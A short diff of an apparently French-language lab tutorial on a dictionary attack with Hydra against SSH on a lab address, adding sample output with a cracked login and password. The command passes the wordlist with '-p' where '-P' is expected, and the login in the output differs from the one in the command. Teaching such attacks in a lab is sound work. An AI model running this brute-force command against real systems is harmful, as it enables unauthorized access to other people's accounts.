@@ -29,7 +29,16 @@ Ici nous allons utiliser une variante de l'attaque brute force, **attaque par di
 
 Lancer Hydra sous Kalilinux
 
-hydra -l idpatron -p /usr/share/wordlists/rockyou.txt -u -e s ssh://192.168.56.XX
+    hydra -l idpatron -p /usr/share/wordlists/rockyou.txt -u -e s ssh://192.168.56.XX
+
+Réponse :
+>
+> hydra ....
+>
+>...
+>
+>[22][ssh] host: 192.168.56.XX  login: ippatron  password: mdpdepatron
+>
 
 
 > [!NOTE]
